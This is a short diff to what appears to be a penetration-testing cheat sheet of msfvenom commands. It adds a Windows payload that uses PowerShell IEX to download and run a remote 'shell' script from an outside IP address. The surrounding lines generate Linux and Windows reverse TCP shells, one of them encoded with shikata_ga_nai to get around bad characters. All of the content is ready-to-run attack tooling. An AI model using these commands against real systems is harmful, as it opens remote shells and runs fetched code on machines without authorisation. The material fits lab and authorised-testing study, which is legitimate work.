@@ -10,6 +10,9 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.69 LPORT=4444 cmd=/bin/sh 
 ### Windows EXE
 
 ```bash
+# nishang reverse shell EXE (shell is Invoke powershell script)
+msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://10.10.14.32/shell')\""
+
 # bad characters, exitfunc, python, windows platform, 32bit architecture, set generated code with var name 'shellcode'
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.247.129 LPORT=443 -f python -a x86 --platform -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -v shellcode EXITFUNC=thread
 
